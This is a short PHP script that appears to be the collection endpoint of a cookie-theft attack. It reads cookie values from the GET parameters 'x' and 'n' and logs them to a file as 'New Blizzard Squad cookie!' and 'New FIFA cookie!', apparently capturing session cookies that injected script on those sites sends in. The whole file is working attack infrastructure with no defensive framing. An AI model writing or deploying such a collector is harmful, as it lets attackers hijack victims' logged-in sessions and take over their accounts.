<?php
    include "helper_functions.php";
    
    if(!empty($_GET["x"]))
    {
        $cookie = $_GET["x"];
        log_to_file("New Blizzard Squad cookie! Cookie: " . $cookie);
    }
    
    if(!empty($_GET["n"]))
    {
        $cookie = $_GET["n"];
        log_to_file("New FIFA cookie! Cookie: " . $cookie);
    }
    
?>
